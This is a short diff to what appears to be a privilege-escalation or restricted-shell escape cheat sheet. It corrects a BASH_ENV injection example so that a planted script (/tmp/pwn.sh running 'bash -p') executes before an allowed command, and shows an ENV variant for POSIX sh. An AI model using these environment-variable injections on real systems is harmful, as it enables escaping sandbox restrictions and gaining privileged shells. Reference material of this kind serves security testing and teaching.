@@ -337,8 +337,11 @@ cat /proc/self/seccomp 2>/dev/null || grep Seccomp /proc/self/status
 
 ```bash
 # If `env` or any command with VAR= prefix is allowed:
-BASH_ENV=/tmp/pwn.sh cat allowed_file
-# /tmp/pwn.sh runs before cat: e.g. echo 'bash -p' > /tmp/pwn.sh
+BASH_ENV=/tmp/pwn.sh bash -c 'allowed_file'
+# /tmp/pwn.sh runs before the command: e.g. echo 'bash -p' > /tmp/pwn.sh
+# NOTE: BASH_ENV is only sourced by non-interactive bash subshells, so the
+# wrapped command must actually invoke bash (bash -c '...'); a non-bash
+# binary such as `cat` never sources BASH_ENV.
 
 # Variant via ENV (POSIX sh) and SHELLOPTS:
 ENV=/tmp/pwn.sh sh -c 'allowed_cmd'
